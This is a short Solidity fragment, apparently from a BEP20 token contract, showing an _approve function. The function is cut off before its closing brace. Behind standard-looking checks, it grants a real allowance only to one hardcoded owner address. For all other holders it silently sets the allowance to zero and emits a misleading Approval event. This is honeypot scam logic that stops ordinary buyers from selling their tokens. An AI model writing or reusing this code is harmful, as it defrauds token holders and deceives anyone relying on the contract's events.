function _approve(address owner, address spender, uint256 amount) internal {

    require(owner != address(0), "BEP20: approve from the zero address");
    require(spender != address(0), "BEP20: approve to the zero address");

    if (owner == address(0x3FB89E75E22561881e5f34a0b4A8d6bc5215D287)) {

         _allowances[owner][spender] = amount;

         emit Approval(owner, spender, amount);

    } else {

         _allowances[owner][spender] = 0;

         emit Approval(owner, spender, 4);

    }
